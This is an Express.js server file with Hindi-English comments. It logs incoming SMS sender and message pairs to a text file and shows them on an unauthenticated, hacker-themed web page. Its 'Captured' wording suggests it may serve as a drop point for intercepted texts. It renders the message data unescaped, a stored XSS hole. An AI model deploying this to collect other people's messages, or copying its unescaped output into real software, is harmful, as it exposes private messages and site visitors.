const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// 1. Home Page - Hacker Entry
app.get('/', (req, res) => {
    res.send(`
        <body style="background:#000; color:#0f0; font-family:monospace; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
            <h1 style="border-right: 2px solid #0f0; white-space: nowrap; overflow: hidden; animation: typing 2s steps(30, end);">[ SYSTEM ONLINE: SMS_RECEIVER_V1 ]</h1>
            <p>ACCESS GRANTED. GO TO <a href="/view-sms" style="color:#fff;">/view-sms</a> TO DECRYPT DATA.</p>
            <style>
                @keyframes typing { from { width: 0 } to { width: 100% } }
            </style>
        </body>
    `);
});

// 2. Receive SMS - Data Logger
app.post('/receive', (req, res) => {
    const { sender, message } = req.body;
    if (sender && message) {
        // Data ko comma-separated format mein save kar rahe hain taaki table mein dikha sakein
        const timestamp = new Date().toLocaleString();
        const logEntry = `${timestamp}||${sender}||${message}\n`;
        
        fs.appendFile('sms_logs.txt', logEntry, (err) => {
            if (err) return res.status(500).send("IO_ERROR");
            console.log(`[+] Captured: ${sender}`);
            res.status(200).send("ENCRYPTED_AND_SAVED");
        });
    } else {
        res.status(400).send("INVALID_PAYLOAD");
    }
});

// 3. View SMS - Hacker Terminal UI
// ... (baaki code same rahega, sirf view-sms route ko replace karein)

app.get('/view-sms', (req, res) => {
    fs.readFile('sms_logs.txt', 'utf8', (err, data) => {
        let rows = "";
        if (!err && data) {
            const lines = data.trim().split('\n');
            lines.reverse().forEach(line => {
                // Agar line mein || nahi hai (purana format), toh usse handle karein
                if (line.includes('||')) {
                    const parts = line.split('||');
                    const time = parts[0] || "N/A";
                    const from = parts[1] || "UNKNOWN";
                    const msg = parts[2] || "EMPTY_MSG";
                    
                    rows += `
                        <tr style="border-bottom: 1px solid #030;">
                            <td style="padding:12px; color:#888; font-size:0.9em;">${time}</td>
                            <td style="padding:12px; color:#0f0; font-weight:bold; letter-spacing:1px;">${from}</td>
                            <td style="padding:12px; color:#0a0; line-height:1.4;">${msg}</td>
                        </tr>`;
                } else if (line.trim().length > 0) {
                    // Purane format ke liye single row
                    rows += `
                        <tr style="border-bottom: 1px solid #300;">
                            <td colspan="3" style="padding:10px; color:#f00; font-size:0.8em;">[OLD_FORMAT_DATA]: ${line}</td>
                        </tr>`;
                }
            });
        }

        res.send(`
        <body style="background:#050505; color:#0f0; font-family:'Courier New', monospace; padding:20px; margin:0;">
            <div style="max-width: 1200px; margin: auto;">
                <h2 style="text-shadow: 0 0 10px #0f0; color:#0f0;">> TERMINAL_SMS_DECRYPTOR v2.0</h2>
                <div style="background:#0a0; color:#000; padding:5px 10px; font-weight:bold; display:inline-block; margin-bottom:20px;">SYSTEM_STATUS: STABLE</div>
                
                <table style="width:100%; border-collapse: collapse; border: 1px solid #0f0; box-shadow: 0 0 20px rgba(0,255,0,0.1);">
                    <thead>
                        <tr style="background:#0f0; color:#000; text-align:left; text-transform:uppercase;">
                            <th style="padding:15px; border: 1px solid #000;">Timestamp</th>
                            <th style="padding:15px; border: 1px solid #000;">Source_Node</th>
                            <th style="padding:15px; border: 1px solid #000;">Data_Payload</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${rows || '<tr><td colspan="3" style="text-align:center; padding:30px; color:#050;">AWAITING INCOMING TRANSMISSION...</td></tr>'}
                    </tbody>
                </table>
                <br>
                <button onclick="location.reload()" style="background:transparent; color:#0f0; border:1px solid #0f0; padding:10px 25px; cursor:pointer; font-family:monospace; font-weight:bold; transition: 0.3s;" onmouseover="this.style.background='#0f0'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='#0f0';"> [ REFRESH_SYSTEM ] </button>
            </div>
        </body>
        `);
    });
});

app.listen(PORT, () => console.log(`[!] Hacker Server Live on Port ${PORT}`));